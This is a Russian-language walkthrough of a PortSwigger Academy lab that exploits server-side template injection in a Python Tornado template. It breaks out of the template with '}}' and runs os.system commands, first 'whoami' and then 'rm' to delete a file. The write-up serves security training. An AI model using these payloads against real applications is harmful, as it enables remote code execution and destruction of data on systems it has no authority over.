Перейдем на уявзимый ресурс и залогинимся под `wiener:peter`

далее перейдем в любую карточку товара и оставим комментарий, где коммент - возможные пэйлоады для выявления SSTI 
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```
И увидим, что нигде заветные `49` не высветились, печаль беда. Но! если не получилось в комментарии, давайте попробуем в отображение пользователя
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/2.%20Basic%20server-side%20template%20injection%20(code%20context)/pics%20for%20walkthrough/1.png)

В личном кабинете есть возможность изменить отображение пользователя - выберем там `First name `

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/2.%20Basic%20server-side%20template%20injection%20(code%20context)/pics%20for%20walkthrough/2.png)

и перейдем в `Proxy` -> `HTTP history` и найдем данный запрос и отправим его в `Repeater`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/2.%20Basic%20server-side%20template%20injection%20(code%20context)/pics%20for%20walkthrough/3.png)

зменим на какой-нибудь несуществующий тип юзера, к примеру `user.test`

Отправим 
```
blog-post-author-display=user.test&csrf=uAIrnbIkz7uWXFYKr2sSed5FCGHE6RS7
```


![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/2.%20Basic%20server-side%20template%20injection%20(code%20context)/pics%20for%20walkthrough/4.png)

и далее вернеся к странице с блогом и видим, что нам выдало внутреннюю ошибку на сервере. Внутренняя ошибка это хорошо. Значит что мы все-таки смогли что-то сломать

```
Traceback (most recent call last): File "<string>", line 16, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 348, in generate return execute() File "<string>.generated.py", line 4, in _tt_execute AttributeError: User instance has no attribute 'test'
```
В ошибке мы видим, что используется фрэймворк `торнадо`, он на питоне 
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/2.%20Basic%20server-side%20template%20injection%20(code%20context)/pics%20for%20walkthrough/5.png)

Далее, пошерстив документацию и поняв, что под капотом там `{{code}}` нам необходимо выйти за данные скобки, добавив `}}` перед нашей SSTI соответсвенно, получим
```
blog-post-author-display=user.first_name}}{{7*7}}&csrf=uAIrnbIkz7uWXFYKr2sSed5FCGHE6RS7
```


![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/2.%20Basic%20server-side%20template%20injection%20(code%20context)/pics%20for%20walkthrough/6.png)

и вернувшись в блог увидим, что никакой внутренней ошибки уже нет, и в имени нам вывелась заветные `49` 

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/2.%20Basic%20server-side%20template%20injection%20(code%20context)/pics%20for%20walkthrough/7.png)

отлично, пока мы ресерчили как работает торнадо нашли великолепную статью `https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#tornado-python`

и там написано как эксплойтить торнадо
```
{% import os %}
{{os.system('whoami')}}
```
Этим и займемся 

Просто вставим эксплойт как в хактулзах
```
{% import os %}{{os.system('whoami')}}
```
Внедрим 
```
blog-post-author-display=user.first_name }}{% import os %}{{os.system('whoami')}}&csrf=uAIrnbIkz7uWXFYKr2sSed5FCGHE6RS7
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/2.%20Basic%20server-side%20template%20injection%20(code%20context)/pics%20for%20walkthrough/8.png)

Перейдем по всем редиректам, вернеся на нашу страницу с блогом и увидим, что отработало

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/2.%20Basic%20server-side%20template%20injection%20(code%20context)/pics%20for%20walkthrough/9.png)

Олично, удалим директорию `/home/carlos/morale.txt` как это и требует задание
```
blog-post-author-display=user.first_name }}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}&csrf=uAIrnbIkz7uWXFYKr2sSed5FCGHE6RS7
```

и получим уведомление об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/2.%20Basic%20server-side%20template%20injection%20(code%20context)/pics%20for%20walkthrough/10.png)
